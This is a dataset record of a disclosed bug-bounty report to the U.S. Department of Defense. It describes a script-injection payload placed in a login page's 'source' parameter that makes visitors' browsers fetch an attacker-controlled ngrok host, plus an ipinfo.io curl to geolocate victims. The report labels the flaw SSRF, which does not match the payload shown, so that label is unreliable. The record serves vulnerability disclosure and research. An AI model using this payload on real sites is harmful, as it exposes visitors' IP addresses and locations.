{
    "reported_to": "U.S. Dept Of Defense",
    "reported_by": "iamrose ",
    "title": "SSRF in login page using fetch API exposes victims IP address to attacker controled server",
    "content": "\nNote: This is similar to my last report #991163.\nSummary:\nServer Side Request Forgery Exposes Victims Ip Address to External Server and which made attacker possible to determine physical location of Victim with IP Tracing.\nDescription:\nServer Side Request Forgery is the critical vulnerability occurring in web application where attacker can perform malicious action on behalf of server. SSRF can lead to port scanning, cross domain hijacking, pivoting , extracting system files and many more. In this case, I use ngrok to generate our custom domain to prove occurrence of SSRF. Once I have custom ngrok domain i can analyze all request that are coming to the domain.\nI used fetch() API property of JS to perform cross domain request and perform Server Side Request Forgery.\nStep-by-step Reproduction Instructions\nOpen the URL https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nOpen your ngrok instance and copy your listener domain it\nSSRF payload '><script>fetch('your ngrok instance')</script>\nAppend payload to source parameter\nFinal Crafted URL\u2588\u2588\u2588\u2588&source='><script>fetch('your ngrok instance')</script>&server=submit.moboard.com&display=Please+log+on&title=%3C\nOpen 127.0.0.1:4040 in browser to analyze all incoming request\nOpen URL of Step 5 from any other device than the device ngrok is running\nThe request from US navy hits our ngrok client in 127.0.0.1:4040\nThe request contain ip address of victim who opened the URL, browser info, Operating System and many more.\nWe can trace victim location with ~$curl ipinfo.io/IP-address-of-victim\nScreenshot is attached below with the request from navy server that hit my ngrok client\nProduct, Version, and Configuration (If applicable)\nBrowser: Firefox 80.0.1 64 Bit\n## Suggested Mitigation/Remediation Actions\nImpact\nServer Side Request Forgery Exposes Victims Ip Address to External Server and which made attacker possible to determine physical location of Victim with IP Tracing. Also, attacker can launch port scans, launch exploits to whoever visits the US NAVY Website.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Server-Side Request Forgery (SSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1610505660,
    "report_url": "https://hackerone.com/reports/996273",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Open the URL https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588"
        ],
        [
            2,
            "Set up an ngrok instance and copy your listener domain"
        ],
        [
            3,
            "Craft the SSRF payload: '><script>fetch('your ngrok instance')</script>"
        ],
        [
            4,
            "Append the payload to the source parameter in the URL"
        ],
        [
            5,
            "Open 127.0.0.1:4040 in browser to analyze incoming requests"
        ],
        [
            6,
            "Open the crafted URL from another device"
        ],
        [
            7,
            "Observe the victim's IP and details in the ngrok client"
        ]
    ],
    "vuln_description": "Server Side Request Forgery (SSRF) in the login page using fetch API exposes the victim's IP address to an attacker-controlled server. This allows the attacker to determine the victim's physical location via IP tracing and potentially perform further attacks like port scanning or exploiting internal services.",
    "reason": "The attack involves setting up an ngrok instance and crafting a specific payload to trigger the SSRF. While the steps are straightforward, the interaction between the payload and the server's response to fetch the victim's IP is non-obvious. However, the components (ngrok, fetch API, SSRF) are commonly known in security testing.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": "991163"
}